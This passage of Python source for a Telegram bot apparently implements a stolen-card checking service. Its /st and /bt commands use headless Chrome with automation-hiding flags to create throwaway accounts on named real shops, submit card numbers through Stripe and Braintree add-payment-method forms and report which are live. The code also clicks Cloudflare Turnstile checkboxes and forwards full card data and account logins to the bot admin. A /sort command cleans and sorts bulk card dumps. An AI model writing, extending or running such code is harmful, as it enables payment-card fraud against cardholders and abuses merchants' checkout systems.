                photo=photo,
                caption=(caption or "")[:950],  # keep under Telegram caption limits
                parse_mode="Markdown",
            )
    except Exception:
        # Don't let admin reporting break the user flow
        pass
    finally:
        try:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass

# ---------- SINGLE CARD ----------
async def st_single_main(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    username = update_dict.get("username", "User")
    bot = Bot(BOT_TOKEN)

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format.\nUse: `/st 4111111111111111|08|25|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, cvv = parsed
    expiry = f"{mm}/{yy}"
    full_card = f"{card}|{mm}|20{yy}|{cvv}"
    start_time = time.time()
    bin_info, bin_details = get_bin_info(card[:6])
    bin_flag = (bin_details or {}).get("country_flag", "")

    try:
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 15)

        email = f"user{random.randint(10000,99999)}@example.com"
        password = f"Pass{random.randint(1000,9999)}!"

        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")

        for attempt in range(1, 4):
            try:
                if attempt > 1:
                    driver.refresh()
                    time.sleep(2)
                if attempt == 1:
                    wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
                    driver.find_element(By.ID, "reg_password").send_keys(password)
                    driver.find_element(By.NAME, "register").click()
                    time.sleep(3)

                try:
                    dismiss = driver.find_element(By.CLASS_NAME, "woocommerce-store-notice__dismiss-link")
                    driver.execute_script("arguments[0].click();", dismiss)
                except:
                    pass

                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False)
                # Fill a random ZIP if the form asks for it (Stripe postal + any outside field)
                try:
                    _fill_zip_outside_stripe_if_present(driver, _random_us_zip())
                except Exception:
                    pass
                # Opt-out of "Save my information for faster checkout" (Link) to avoid phone requirement
                try:
                    _st_opt_out_faster_checkout(driver)
                except Exception:
                    pass
                wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()

                # wait for success or error message
                status = "Declined"
                response_text = None
                for _ in range(10):  # 5s max
                    try:
                        success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                        if "successfully added" in success.text.lower():
                            status = "Approved"
                            response_text = success.text.strip()
                            break
                    except:
                        pass
                    try:
                        error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                        response_text = error.text.strip()
                        break
                    except:
                        pass
                    time.sleep(0.5)

                if not response_text:
                    response_text = "Unknown"

                took = f"{time.time() - start_time:.2f}s"
                emoji = "✅" if status == "Approved" else "❌"
                result_msg = (
                    f"💳 **Card:** `{full_card}`\n"
                    f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
                    f"📟 **Status:** {emoji} **{status}**\n"
                    f"📩 **Response:** `{response_text}`\n"
                    f"🔁 **Attempt:** {attempt}/3\n"
                    f"🌐 **Gateway:** **Stripe-Auth-1**\n"
                    f"⏱ **Took:** **{took}**\n"
                    f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
                )
                await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
                return

            except Exception as e:
                if attempt == 3:
                    await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                        text=f"❌ Failed after 3 attempts.\nError: `{str(e)}`",
                        parse_mode="Markdown")
                    # Send screenshot + trace to admin (best-effort)
                    try:
                        admin_caption = (
                            "ST Error (after 3 attempts)\n"
                            f"💳 `{full_card}`\n"
                            f"🏦 `{bin_info}` {bin_flag}\n"
                            f"📩 `{_st_md_safe(str(e))[:320]}`\n"
                            f"🧑‍💻 {username} [`{uid}`]"
                        )
                        await _st_send_admin_screenshot(bot, driver, admin_caption)
                    except Exception:
                        pass
                    try:
                        await bot.send_message(
                            chat_id=BOT_ADMIN_ID,
                            text=f"ST Error:\n```\n{traceback.format_exc()[:3500]}\n```",
                            parse_mode="Markdown",
                        )
                    except Exception:
                        pass
                    return
    finally:
        try:
            driver.quit()
        except:
            pass

async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    if not is_approved(uid, "st"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("st"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = (update.message.reply_to_message.text or "").strip()

    cards = extract_all_card_inputs(raw_input)

    if not cards:
        await update.message.reply_text("❌ No valid card found.\nUse: `/st 4111111111111111|08|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    if len(cards) > 1:
        await update.message.reply_text(
            "⚠️ Batch mode has been removed for `/st`.\nSend only **one** card at a time.\n\nUse: `/st 4111111111111111|08|25|123`",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id,
        )
        return

    card_input = cards[0]
    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "username": uname,
    }
    Process(target=run_st_process, args=(card_input, update_dict), daemon=True).start()

# ==== 9. /bt Command (with mail:pass send to admin) ====
def run_bt_check(card_str, chat_id, message_id):
    asyncio.run(_bt_check(card_str, chat_id, message_id))

async def _bt_check(card_str, chat_id, message_id):
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from fake_useragent import UserAgent
    import tempfile
    import shutil

    start = time.time()
    bot = Bot(BOT_TOKEN)

    def extract_card_parts(card_str):
        match = re.search(r'(\d{12,19})\D+(\d{1,2})[\/|]?(20)?(\d{2,4})\D+(\d{3,4})', card_str)
        if not match:
            return None
        return match.group(1), match.group(2).zfill(2), match.group(4)[-2:], match.group(5)

    async def fail_user():
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="❌ Payment failed. Try again later.",
            parse_mode="Markdown"
        )

    async def fail_admin(trace, email=None, password=None):
        screenshot = "bt_fail.png"
        try:
            driver.save_screenshot(screenshot)
            caption = f"```\n{trace[:950]}\n```"
            if email and password:
                caption += f"\n\n`{email}:{password}`"
            with open(screenshot, "rb") as photo:
                await bot.send_photo(
                    chat_id=BOT_ADMIN_ID,
                    photo=photo,
                    caption=caption,
                    parse_mode="Markdown"
                )
            os.remove(screenshot)
        except Exception as ss_err:
            text = f"BT Exception (no screenshot):\n```\n{trace[:950]}\n```"
            if email and password:
                text += f"\n\n`{email}:{password}`"
            text += f"\nScreenshot error: {ss_err}"
            await bot.send_message(
                chat_id=BOT_ADMIN_ID,
                text=text,
                parse_mode="Markdown"
            )

    for attempt in range(1, 4):
        temp_profile_dir = tempfile.mkdtemp()
        driver = None
        email = password = None
        try:
            ua = UserAgent()
            options = webdriver.ChromeOptions()
            options.binary_location = CHROME_PATH
            options.add_argument(f"--user-data-dir={temp_profile_dir}")
            options.add_argument(f"user-agent={ua.random}")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--headless=new")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--window-size=1920,1080")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_experimental_option("prefs", {
                "profile.managed_default_content_settings.images": 2,
                "profile.managed_default_content_settings.stylesheets": 2
            })

            driver = webdriver.Chrome(service=Service(CHROME_DRIVER_PATH), options=options)
            wait = WebDriverWait(driver, 20)

            # 1. Go to billing address form
            driver.get("https://truedark.com/my-account/edit-address/billing/")
            time.sleep(1)

            # --- Cookie & Popup Handling ---
            try:
                accept_btn = driver.find_element(By.CSS_SELECTOR, "button.cmplz-btn.cmplz-accept")
                if accept_btn.is_displayed():
                    driver.execute_script("arguments[0].click();", accept_btn)
                    WebDriverWait(driver, 5).until_not(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, ".cmplz-cookiebanner"))
                    )
                    time.sleep(0.3)
            except Exception:
                pass

            # Cloudflare Turnstile (if present)
            try:
                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='turnstile']")
                driver.switch_to.frame(iframe)
                wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='checkbox']"))).click()
                driver.switch_to.default_content()
                time.sleep(1)
            except:
                pass

            # Klaviyo popup close (if present)
            try:
                popup = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'klaviyo-close-form')]")))
                popup.click()
            except:
                pass

            email = random_email()
            password = random_password()

            wait.until(EC.presence_of_element_located((By.ID, "reg_email"))).send_keys(email)
            wait.until(EC.presence_of_element_located((By.ID, "reg_password"))).send_keys(password)
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class,'woocommerce-form-register__submit')]"))).click()

            # Billing details
            wait.until(EC.element_to_be_clickable((By.ID, "select2-billing_country-container"))).click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("United States" + u'\ue007')
            driver.find_element(By.ID, "select2-billing_state-container").click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("Alabama" + u'\ue007')

            driver.find_element(By.ID, "billing_first_name").send_keys("Lucas")
            driver.find_element(By.ID, "billing_last_name").send_keys("Miller")
            driver.find_element(By.ID, "billing_address_1").send_keys("123 Main St")
            driver.find_element(By.ID, "billing_city").send_keys("Austin")
            driver.find_element(By.ID, "billing_postcode").send_keys("98101")
            driver.find_element(By.ID, "billing_phone").send_keys("20255501" + ''.join(random.choices(string.digits, k=2)))

            # Hide cookie banner again (for double-safety)
            try:
                cookie_banner = driver.find_element(By.CLASS_NAME, "cmplz-cookiebanner")
                if cookie_banner.is_displayed():
                    driver.execute_script("arguments[0].style.display='none';", cookie_banner)
                    time.sleep(0.3)
            except:
                pass

            # Scroll to and click save address
            save_btn = wait.until(EC.element_to_be_clickable((By.NAME, "save_address")))
            driver.execute_script("arguments[0].scrollIntoView(true);", save_btn)
            time.sleep(0.1)
            save_btn.click()
            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # 2. Go to add-payment-method
            driver.get("https://truedark.com/my-account/add-payment-method/")
            time.sleep(1.5)

            parts = extract_card_parts(card_str)
            if not parts:
                raise Exception("Invalid card format.")
            card, mm, yy, cvv = parts
            exp = f"{mm} / {yy}"
            bin_info, bin_details = get_bin_info(card[:6])
            bin_flag = (bin_details or {}).get("country_flag", "")

            # Braintree iframe: card
            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")))
            iframe_number = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")
            driver.switch_to.frame(iframe_number)
            wait.until(EC.presence_of_element_located((By.ID, "credit-card-number"))).send_keys(card)
            driver.switch_to.default_content()

            # Braintree iframe: expiry
            iframe_exp = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-expirationDate']")
            driver.switch_to.frame(iframe_exp)
            wait.until(EC.presence_of_element_located((By.ID, "expiration"))).send_keys(exp)
            driver.switch_to.default_content()

            # Braintree iframe: cvv
            iframe_cvv = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-cvv']")
            driver.switch_to.frame(iframe_cvv)
            wait.until(EC.presence_of_element_located((By.ID, "cvv"))).send_keys(cvv)
            driver.switch_to.default_content()

            place_btn = wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
            driver.execute_script("arguments[0].scrollIntoView(true);", place_btn)
            try:
                place_btn.click()
            except:
                driver.execute_script("arguments[0].click();", place_btn)

            # Wait for result
            result_el = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,
                "div.woocommerce-error, div.woocommerce-message, div.message-container.alert-color, div.message-container.success-color")))
            result_text = result_el.text.strip()
            status = "✅ Approved" if "new payment method added" in result_text.lower() else "❌ Declined"
            full_card = f"{card}|{mm}|20{yy}|{cvv}"
            took = round(time.time() - start, 2)

            msg = (
                f"💳 Card: `{full_card}`\n"
                f"🏦 BIN: `{bin_info}` {bin_flag}\n"
                f"📟 Status: {status}\n"
                f"📩 Response: `{result_text}`\n"
                f"🔁 Attempt: {attempt}/3\n"
                f"🌐 Gateway: Braintree Auth-1\n"
                f"⏱ Took: {took}s"
            )
            await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")

            # Send BT account used to admin
            try:
                await bot.send_message(
                    chat_id=BOT_ADMIN_ID,
                    text=f"BT Account Used:\n`{email}:{password}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

            # Auto-delete approved card
            if "new payment method added" in result_text.lower():
                try:
                    delete_btn = driver.find_element(By.CSS_SELECTOR, "a.button.delete[href*='delete-payment-method']")
                    delete_btn.click()
                    time.sleep(1)
                    try:
                        WebDriverWait(driver, 3).until(EC.alert_is_present())
                        driver.switch_to.alert.accept()
                    except:
                        pass
                    msg += "\n\n🗑️ Card was auto-deleted after approval."
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")
                except Exception as e:
                    msg += f"\n\n⚠️ Card approved, but delete failed: {e}"
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")

            driver.quit()
            shutil.rmtree(temp_profile_dir, ignore_errors=True)
            return

        except Exception:
            if attempt == 3:
                trace = traceback.format_exc()
                await fail_user()
                await fail_admin(trace, email, password)  # Also sends email:pass on fail
            try:
                if driver:
                    driver.quit()
                shutil.rmtree(temp_profile_dir, ignore_errors=True)
            except:
                pass

async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bt"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("bt"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    lines = raw_input.split("\n") if "\n" in raw_input else [raw_input]
    cards = [line.strip() for line in lines if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

    if not cards:
        await update.message.reply_text("❌ No valid card(s) found.\nUse: `/bt 4111111111111111|08|2026|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    if len(cards) > 6:
        await update.message.reply_text("⚠️ You can send a maximum of 6 cards at once.", reply_to_message_id=update.message.message_id)
        return

    for card_str in cards:
        msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()

# ==== 10. /chk Command (Braintree Auth V2, under development) ====
def get_chk_accounts():
    accounts = []
    try:
        with open("chk_accounts.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    email, password = line.split("|", 1)
                    accounts.append((email.strip(), password.strip()))
    except Exception as e:
        print("Failed to read chk_accounts.txt:", e)
    return accounts

async def chk_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "chk"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("chk"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()
    
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text(
            "❌ Invalid card.\nUse: `/chk 4111111111111111|12|25|123`",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id
        )
        return

    # Simple response indicating under development
    msg = await update.message.reply_text(f"💳 `{card_input}`\n🔒 *Braintree Auth V2* - Currently under development\n\n⚠️ This feature is being optimized for better performance and reliability. Check back soon!", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
def extract_and_clean_cards_sort(data_text):
    """
    Extract and clean cards for /sort command.
    Returns tuple: (valid_cards, duplicates_count, expired_count, junk_count, total_raw)
    """
    start_time = time.time()
    
    if not data_text or not isinstance(data_text, str):
        return [], 0, 0, 0, 0
    
    # Split by lines and process each line separately
    lines = data_text.split('\n')
    valid_cards = []
    seen_cards = set()
    duplicates = 0
    expired = 0
    junk = 0
    total_raw = 0
    
    for line in lines:
        # Skip empty lines
        if not line.strip():
            continue
            
        # Clean the line - replace multiple spaces with single space
        line = re.sub(r'\s+', ' ', line.strip())
        
        # FIXED: Improved regex patterns for card extraction
        patterns = [
            r'(\d{12,19})\s*[|/\\]\s*(\d{1,2})\s*[|/\\]\s*(\d{2,4})\s*[|/\\]\s*(\d{3,4})',
            r'(\d{12,19})\s+(\d{1,2})[/-](\d{2,4})\s+(\d{3,4})',
            r'(\d{12,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
            r'(\d{12,19}).*?(\d{1,2})[/-](\d{2,4}).*?(\d{3,4})',
        ]
        
        matches = []
        for pattern in patterns:
            matches = re.findall(pattern, line, re.IGNORECASE)
            if matches:
                break
        
        total_raw += len(matches)
        
        for match in matches:
            card, mm, yy, cvv = match
            
            # Clean and validate
            card = card.strip()
            mm = mm.strip().zfill(2)
            yy = yy.strip()
            cvv = cvv.strip()
            
            # Validate lengths
            if not (12 <= len(card) <= 19):
                junk += 1
                continue
                
            if not (1 <= len(mm) <= 2 and mm.isdigit() and 1 <= int(mm) <= 12):
                junk += 1
                continue
                
            if not (2 <= len(yy) <= 4 and yy.isdigit()):
                junk += 1
                continue
                
            if not (3 <= len(cvv) <= 4 and cvv.isdigit()):
                junk += 1
                continue
            
            # Handle year format
            if len(yy) == 4:
                yy = yy[-2:]
            
            # Skip if year is obviously wrong
            if int(yy) > 40 and int(yy) < 100:
                # Try to find a better year in the line
                year_search = re.search(r'20(\d{2})', line)
                if year_search:
                    yy = year_search.group(1)
                else:
                    junk += 1
                    continue
            
            # Luhn check
            if not luhn_check(card):
                junk += 1
                continue
            
            # Check expiration
            if is_card_expired(mm, yy):
                expired += 1
                continue
            
            # Format card
            formatted = f"{card}|{mm}|{yy}|{cvv}"
            
            # Check for duplicates
            if formatted in seen_cards:
                duplicates += 1
                continue
                
            seen_cards.add(formatted)
            valid_cards.append(formatted)
    
    # Sort cards by BIN (first 6 digits)
    valid_cards.sort(key=lambda x: x[:6])
    
    processing_time = time.time() - start_time
    print(f"Sort processing took {processing_time:.2f} seconds, found {len(valid_cards)} valid cards from {total_raw} raw matches")
    
    return valid_cards, duplicates, expired, junk, total_raw

async def sort_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    username = update.effective_user.username or uname
    
    if not is_approved(uid, "sort"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("sort"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    # Check if message is a reply
    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        data_text = ""
        
        # Check for document attachment
        if replied_msg.document:
            file_size = replied_msg.document.file_size
            if file_size > 10 * 1024 * 1024:  # 10MB limit
                await update.message.reply_text("⚠️ File too large. Maximum size is 10MB.", reply_to_message_id=update.message.message_id)
                return
            
            # Download file
            processing_msg = await update.message.reply_text("📥 Downloading file...", reply_to_message_id=update.message.message_id)
            try:
                file = await context.bot.get_file(replied_msg.document.file_id)
                data_text = await download_file_content(file)
                
                if not data_text.strip():
                    await processing_msg.edit_text("❌ File is empty or could not be read.")
                    return
                    
                await processing_msg.edit_text("🔍 Processing file content...")
            except Exception as e:
                await processing_msg.edit_text(f"❌ Error downloading file: {str(e)}")
                return
        else:
            # Get text from replied message
            data_text = replied_msg.text or replied_msg.caption or ""
    else:
        # Get text from command arguments
        data_text = " ".join(context.args) if context.args else ""
    
    if not data_text or not data_text.strip():
        usage_text = (
            "📝 *Usage:*\n"
            "• `/sort <messy_data>` - Sort cards from text\n"
            "• Reply to a message with `/sort` - Extract from text\n"
            "• Reply to a .txt/.csv/.json file with `/sort` - Extract from file\n\n"
            "📁 *Supported file formats:* TXT, CSV, JSON\n"
            "⚡ *Processing speed:* Up to 50k cards\n"
            "📊 *Output format:* CC|MM|YY|CVV\n\n"
            "*Example:*\n"
            "`/sort 4403932640339759 03/27 401\n"
            "5583410027167381 05/30 896`"
        )
        await update.message.reply_text(usage_text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    
    # Start processing
    start_time_processing = time.time()
    status_msg = await update.message.reply_text("🔄 Processing data... This may take a moment for large files.", reply_to_message_id=update.message.message_id)
    
    try:
        # Extract and clean cards
        valid_cards, duplicates, expired, junk, total_raw = extract_and_clean_cards_sort(data_text)
        total_found = len(valid_cards)
        
        processing_time = time.time() - start_time_processing
        
        # Prepare statistics
        stats = (
            "📊 Sorting Results\n\n"
            f"📄 Total Raw Matches: {total_raw:,}\n"
            f"✅ Valid Cards Found: {total_found:,}\n"
            f"🗑️ Junk Removed: {junk:,}\n"
            f"♻️ Duplicates Removed: {duplicates:,}\n"
            f"⏰ Expired Removed: {expired:,}\n"
            f"⏱️ Processing Time: {processing_time:.2f}s\n\n"
        )
        
        if total_found == 0:
            await status_msg.edit_text(stats + "❌ No valid cards found in the provided data.")
            return
        
        # Store results in context for callback
        unique_id = f"s_{uid}_{int(time.time()) % 10000}"
        context.user_data[unique_id] = {
            'stats': stats,
            'cards': valid_cards,
            'total': total_found,
            'user_id': uid,
            'username': username,
            'timestamp': time.time()
        }
        
        # Clean old results (older than 1 hour)
        for key in list(context.user_data.keys()):
            if key.startswith("s_") or key.startswith("c_"):
                result_data = context.user_data[key]
                if time.time() - result_data.get('timestamp', 0) > 3600:
                    del context.user_data[key]
        
        # Decide output method
        if total_found <= 15:
            # Send in message for small results
            cards_text = "\n".join(valid_cards)
            if len(cards_text) <= 1800:  # Leave room for stats
                full_text = stats + "```\n" + cards_text + "\n```"
                await status_msg.edit_text(full_text, parse_mode="Markdown")
            else:
                # Too large for single message, send as file
                await send_sort_results_file(uid, unique_id, context, status_msg, update.message.chat.id)
        else:
            # For more than 15 cards, offer choice or auto-file
            keyboard = [
                [
                    InlineKeyboardButton("📄 Send as TXT File", callback_data=f"s_file:{unique_id}"),
                    InlineKeyboardButton("📝 Show in Message", callback_data=f"s_show:{unique_id}")
                ],
                [
                    InlineKeyboardButton("🗑️ Clear Session", callback_data=f"s_clr:{unique_id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await status_msg.edit_text(
                stats + f"📋 Found **{total_found:,}** cards. How would you like to receive the results?",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
    
    except Exception as e:
        error_trace = traceback.format_exc()
        print(f"Sort error: {error_trace}")
        error_msg = f"❌ Error processing data: {str(e)[:100]}"
        await status_msg.edit_text(error_msg)
        
        # Send full error to admin
        if uid != BOT_ADMIN_ID:
            try:
                await context.bot.send_message(
                    BOT_ADMIN_ID,
                    f"❌ Sort error from user {uid}:\n{error_trace[:1000]}"
                )
            except:
                pass

async def send_sort_results_file(user_id, unique_id, context, original_message, chat_id):
    """Send sorted results as a text file (CLEAN FORMAT - ONLY CARDS)"""
    if unique_id not in context.user_data:
        await original_message.edit_text("❌ Results expired. Please run /sort again.")
        return
    
    results = context.user_data[unique_id]
    
    # Check authorization
    if results['user_id'] != user_id and not is_admin(user_id):
        await original_message.edit_text("❌ You are not authorized to view these results.")
        return
    
    cards = results['cards']
    total = results['total']
    
    # FIXED: Create file content with ONLY CARDS (no extra text)
    file_content = "\n".join(cards)
    
    # Send as file
    try:
        with BytesIO(file_content.encode('utf-8')) as file_buffer:
            file_buffer.name = f"sorted_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            await context.bot.send_document(
                chat_id=chat_id,
                document=file_buffer,
                caption=f"📁 Sorted Cards ({total:,} cards)\n👤 Processed by: {results['username']}",
            )
        
        await original_message.edit_text(f"✅ Sent as file with {total:,} cards (clean format).")
    except Exception as e:
        print(f"Error sending file: {e}")
        await original_message.edit_text(f"❌ Error sending file: {str(e)[:100]}")

async def sort_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle sort command callbacks"""
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass  # Ignore timeout errors
    
    user_id = query.from_user.id
    data = query.data
    
    if not data:
        return
    
    if data.startswith("s_clr:"):
        # Clear session
        unique_id = data.split(":")[1]
        if unique_id in context.user_data:
            del context.user_data[unique_id]
        await query.edit_message_text("🗑️ Session cleared. Run /sort again to process new data.")
        return
    
    elif data.startswith("s_file:"):
        # Send as file
        unique_id = data.split(":")[1]
        await send_sort_results_file(user_id, unique_id, context, query.message, query.message.chat.id)
        return
    
    elif data.startswith("s_show:"):
        # Show in message
        unique_id = data.split(":")[1]
        
        if unique_id not in context.user_data:
            await query.edit_message_text("❌ Results expired. Please run /sort again.")
            return
        
        results = context.user_data[unique_id]
        
        # Check authorization
        if results['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view these results.")
            return
        
        stats = results['stats']
        cards = results['cards']
        total = results['total']
        
        # Truncate if too large
        max_chars = 3500  # Leave room for stats
        cards_text = "\n".join(cards)
        
        if len(cards_text) > max_chars:
            # Count lines truncated
            lines = cards_text.split('\n')
            if len(lines) > 20:
                cards_display = '\n'.join(lines[:20])
                cards_display += f"\n\n... and {len(lines) - 20} more cards (view full list in file)"
            else:
                cards_display = cards_text[:max_chars] + "..."
        else:
            cards_display = cards_text
        
        # Escape Markdown special characters in cards
        cards_display_escaped = cards_display.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
        
        full_text = stats + "```\n" + cards_display_escaped + "\n```"
        
        # Create new keyboard with clear option
        keyboard = [
            [
                InlineKeyboardButton("📄 Get Full TXT File", callback_data=f"s_file:{unique_id}"),
                InlineKeyboardButton("🗑️ Clear Session", callback_data=f"s_clr:{unique_id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await query.edit_message_text(full_text, parse_mode="Markdown", reply_markup=reply_markup)
        except Exception as e:
            # If still too large, send as file instead
            print(f"Message too large, falling back to file: {e}")
            await send_sort_results_file(user_id, unique_id, context, query.message, query.message.chat.id)

# ==== 13. Updated Admin Commands (per-command approve) ====
def _normalize_cmd_arg(arg: str) -> str | None:
    a = (arg or "").lower().strip()
    if a in ("all", *CMD_KEYS):
        return a
    return None

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        # FIXED: Properly escape backticks in Markdown
        await update.message.reply_text(
            "⚠️ Usage: `/approve <user_id> <cmd|all>`\nExample: `/approve 123456 st`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(
            f"❌ Unknown command type. Use one of: `{', '.join(CMD_KEYS)}` or `all`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return

    if cmd == "all":
        approved_all.add(uid)
        approved_users.add(uid)
    else:
        approved_cmds[cmd].add(uid)

    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"✅ Approved `{uid}` for `{cmd}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def unapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "⚠️ Usage: `/unapprove <user_id> <cmd|all>`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(
            f"❌ Unknown command type. Use one of: `{', '.join(CMD_KEYS)}` or `all`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return

    if cmd == "all":
        approved_all.discard(uid)
        approved_users.discard(uid)
        for k in CMD_KEYS:
            approved_cmds[k].discard(uid)
    else:
        approved_cmds[cmd].discard(uid)

    save_users()
    
    await update.message.reply_text(f"🗑️ Revoked `{cmd}` from `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

